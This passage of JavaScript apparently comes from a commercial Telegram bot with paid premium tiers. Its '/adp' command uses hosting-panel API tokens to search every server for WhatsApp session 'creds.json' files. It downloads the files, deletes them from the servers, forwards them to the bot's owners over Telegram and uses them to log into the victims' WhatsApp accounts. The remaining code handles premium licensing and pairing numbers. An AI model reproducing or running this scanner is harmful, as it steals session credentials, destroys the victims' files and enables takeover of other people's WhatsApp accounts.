  });

  /* ── panel scanner (ported /adp) ────────────────────────────────── */
  bot.command("adp", async (ctx) => {
    const DELAY = 250;
    const input = ctx.message.text.split(" ").slice(1);
    if (input.length < 3) return ctx.reply("Usage: /adp http://domain.com plta_xxxx pltc_xxxx");

    const domainBase = input[0].replace(/\/+$/, "");
    const plta = input[1], pltc = input[2];

    await ctx.reply("[..] Scanning servers for creds.json...");

    try {
      const appRes  = await axios.get(`${domainBase}/api/application/servers`, { headers: { Accept: "application/json", Authorization: `Bearer ${plta}` } });
      const servers = appRes.data?.data || [];
      if (!servers.length) return ctx.reply("[x] No servers found.");

      let totalFound = 0;
      const commonPaths = [
        "/home/container/session/creds.json",
        "/home/container/sessions/creds.json",
        "/session/creds.json",
        "/sessions/creds.json",
      ];

      for (const srv of servers) {
        const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
        if (!identifier) continue;
        const name = srv.attributes?.name || identifier;

        let credsBuffer = null, usedPath = null;

        for (const p of commonPaths) {
          try {
            const dlMeta = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/download`, { params: { file: p }, headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } });
            if (dlMeta?.data?.attributes?.url) {
              const fileRes = await axios.get(dlMeta.data.attributes.url, { responseType: "arraybuffer" });
              credsBuffer = Buffer.from(fileRes.data);
              usedPath = p;
              break;
            }
          } catch {}
          await sleep(DELAY);
        }

        if (!credsBuffer) { await sleep(DELAY * 2); continue; }
        totalFound++;

        try {
          await axios.post(`${domainBase}/api/client/servers/${identifier}/files/delete`,
            { root: "/", files: [usedPath.replace(/^\/+/, "")] },
            { headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } }
          );
        } catch {}

        let BotNumber = "unknown";
        try {
          const json      = JSON.parse(credsBuffer.toString("utf8"));
          const candidate = json.id || json.phone || json.number ||
            (json.me && (json.me.id || json.me.jid || json.me.user)) ||
            json.clientID || (json.registration && json.registration.phone) || null;
          if (candidate) {
            BotNumber = String(candidate).replace(/\D+/g, "");
            if (!BotNumber.startsWith("234") && BotNumber.length >= 8 && BotNumber.length <= 15)
              BotNumber = "234" + BotNumber;
          } else {
            BotNumber = String(identifier).replace(/\s+/g, "_");
          }
        } catch { BotNumber = String(identifier).replace(/\s+/g, "_"); }

        const sessDir = wa.sessionPath(BotNumber);
        try {
          fs.mkdirSync(sessDir, { recursive: true });
          fs.writeFileSync(path.join(sessDir, "creds.json"), credsBuffer);
        } catch {}

        for (const oid of db.loadAkses().owners) {
          try {
            await ctx.telegram.sendDocument(oid, { source: credsBuffer, filename: `${BotNumber}_creds.json` });
            await ctx.telegram.sendMessage(oid, `[+] <b>Number:</b> <code>${escapeHtml(BotNumber)}</code>\n<b>Server:</b> <code>${escapeHtml(name)}</code>\n<b>Path:</b> <code>${escapeHtml(usedPath)}</code>\n<b>Deleted from server.</b>`, { parse_mode: "HTML" });
          } catch {}
        }

        const adpFlagDir    = path.join(os.tmpdir(), "rv7adpflags");
        fs.mkdirSync(adpFlagDir, { recursive: true });
        const connectedFlag = path.join(adpFlagDir, `${BotNumber}.connected`);
        const failedFlag    = path.join(adpFlagDir, `${BotNumber}.failed`);
        if (fs.existsSync(connectedFlag) || fs.existsSync(failedFlag)) { await sleep(DELAY); continue; }

        try {
          if (fs.existsSync(path.join(sessDir, "creds.json"))) {
            await wa.connectToWhatsApp(BotNumber, ctx);
            fs.writeFileSync(connectedFlag, String(Date.now()));
          }
        } catch (err) {
          const emsg = err?.response?.status ? `HTTP ${err.response.status}` : err.message;
          fs.writeFileSync(failedFlag, JSON.stringify({ time: Date.now(), error: emsg }));
          for (const oid of db.loadAkses().owners) {
            try { await ctx.telegram.sendMessage(oid, `[x] Failed to connect <b>${escapeHtml(BotNumber)}</b>\nError: <code>${escapeHtml(emsg)}</code>`, { parse_mode: "HTML" }); } catch {}
          }
        }
        await sleep(DELAY * 2);
      }

      if (totalFound === 0) ctx.reply("[+] Done. No creds.json found.");
      else ctx.reply(`[+] Done. Found ${totalFound} creds.json (deleted from servers, connection attempted).`);
    } catch (err) {
      console.error("adp error:", err?.response?.data || err.message);
      ctx.reply("[x] Error during scan. Check server logs.");
    }
  });

  /* ── UID-based premium activation (NEW for CIPHER BVG) ──────────── */
  const canManagePremium = (id) => db.isOwner(id) || db.isModerator(id) || db.isAuthorized(id);

  const fmtExpiry = (p) => {
    if (!p || p.expiresAt == null) return "Lifetime";
    return new Date(p.expiresAt).toLocaleString("en-NG", {
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit", timeZone: "Africa/Lagos",
    }) + " WAT";
  };

  bot.command("premium", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!canManagePremium(userId)) return ctx.reply("[!] Access denied.");

    const args   = ctx.message.text.trim().split(/\s+/);
    const uid    = args[1];
    const type   = (args[2] || "lifetime").toLowerCase();
    const daysRaw = parseInt(args[3]) || 0;

    if (!uid || !/^\d{6}$/.test(uid))
      return ctx.reply("Usage: /premium <UID> [monthly|lifetime] [days]\nExample: /premium 482193 monthly 30\nExample: /premium 482193 lifetime");

    const users = db.getUsers();
    const user  = users.find(u => String(u.uid) === uid);
    if (!user) return ctx.reply(`[x] No account found with UID <code>${escapeHtml(uid)}</code>.`, { parse_mode: "HTML" });

    const expiresAt = type === "lifetime"
      ? null
      : Date.now() + ((daysRaw > 0 ? daysRaw : 30) * 86400000);

    user.premium = {
      active: true,
      activatedAt: Date.now(),
      expiresAt,
      type: type === "lifetime" ? "lifetime" : "monthly",
      activatedBy: userId,
    };
    db.saveUsers(users);
    db.logAudit({
      event: "premium.activate",
      uid,
      username: user.username,
      admin: userId,
      type: type === "lifetime" ? "lifetime" : "monthly",
      expiresAt,
    });

    const reply =
      `[+] <b>Premium Activated — ${BOT_NAME}</b>\n\n` +
      `<b>Username :</b> <code>${escapeHtml(user.username)}</code>\n` +
      `<b>UID      :</b> <code>${escapeHtml(uid)}</code>\n` +
      `<b>Type     :</b> ${type === "lifetime" ? "🔷 Lifetime" : "📅 Monthly"}\n` +
      `<b>Expires  :</b> <i>${fmtExpiry(user.premium)}</i>\n` +
      `<b>By       :</b> <code>${userId}</code>`;

    await ctx.reply(reply, { parse_mode: "HTML" });
    await tgNotify(`[premium] ${userId} activated ${type} premium for UID ${uid} (${user.username}).`);
  });

  bot.command("premium-check", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!db.isOwner(userId)) return ctx.reply("[!] Access denied.");

    const uid = (ctx.message.text.trim().split(/\s+/)[1] || "").trim();
    if (!uid) return ctx.reply("Usage: /premium-check <UID>");

    const user = db.getUsers().find(u => String(u.uid) === uid);
    if (!user) return ctx.reply(`[x] No account found with UID <code>${escapeHtml(uid)}</code>.`, { parse_mode: "HTML" });

    const p = user.premium || { active: false };
    const active = p.active && (!p.expiresAt || Date.now() < p.expiresAt);
    ctx.reply(
      `[i] <b>Premium Status</b>\n\n` +
      `<b>Username :</b> <code>${escapeHtml(user.username)}</code>\n` +
      `<b>UID      :</b> <code>${escapeHtml(uid)}</code>\n` +
      `<b>Status   :</b> ${active ? "✅ ACTIVE" : "⛔ INACTIVE"}\n` +
      `<b>Type     :</b> ${p.type ? escapeHtml(p.type.toUpperCase()) : "—"}\n` +
      `<b>Expires  :</b> <i>${fmtExpiry(p)}</i>`,
      { parse_mode: "HTML" }
    );
  });

  bot.command("premium-off", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!db.isOwner(userId)) return ctx.reply("[!] Access denied.");

    const uid = (ctx.message.text.trim().split(/\s+/)[1] || "").trim();
    if (!uid) return ctx.reply("Usage: /premium-off <UID>");

    const users = db.getUsers();
    const user  = users.find(u => String(u.uid) === uid);
    if (!user) return ctx.reply(`[x] No account found with UID <code>${escapeHtml(uid)}</code>.`, { parse_mode: "HTML" });

    if (user.premium) user.premium.active = false;
    db.saveUsers(users);
    db.logAudit({ event: "premium.deactivate", uid, username: user.username, admin: userId });
    ctx.reply(`[+] Premium deactivated for UID <code>${escapeHtml(uid)}</code> (${escapeHtml(user.username)}).`, { parse_mode: "HTML" });
    await tgNotify(`[premium] ${userId} deactivated premium for UID ${uid} (${user.username}).`);
  });

  bot.on("document", async (ctx, next) => {
    const key = userKey(ctx);
    if (!pendingSessionUpload.has(key)) return next();
    pendingSessionUpload.delete(key);
    if (!db.isOwner(ctx.from.id.toString())) return ctx.reply("[!] Owner only.");
    return importSessionFile(ctx, ctx.message.document);
  });

  bot.on("text", async (ctx, next) => {
    const text = String(ctx.message && ctx.message.text || "").trim();
    const key = userKey(ctx);
    if (!text) return next();
    if (text.startsWith("/")) {
      pendingConnectorInput.delete(key);
      pendingSessionUpload.delete(key);
      return next();
    }
    const pending = pendingConnectorInput.get(key);
    if (!pending) return next();
    if (pending.kind === "add-number") {
      const id = ctx.from.id.toString();
      if (!canConnectNumber(id)) {
        pendingConnectorInput.delete(key);
        return ctx.reply("[!] Access denied.");
      }
      const number = wa.normalizePhoneNumber(text);
      if (!number || number.length < 7 || number.length > 15)
        return ctx.reply("[x] Invalid number. Send a valid international number, for example +92 300 1234567, or tap Cancel.", { reply_markup: connectorCancelKeyboard() });
      pendingConnectorInput.delete(key);
      return wa.connectToWhatsApp(number, ctx);
    }
    return next();
  });

  return { tgNotify, generateKey, parseDuration };
}

module.exports = { registerBot };
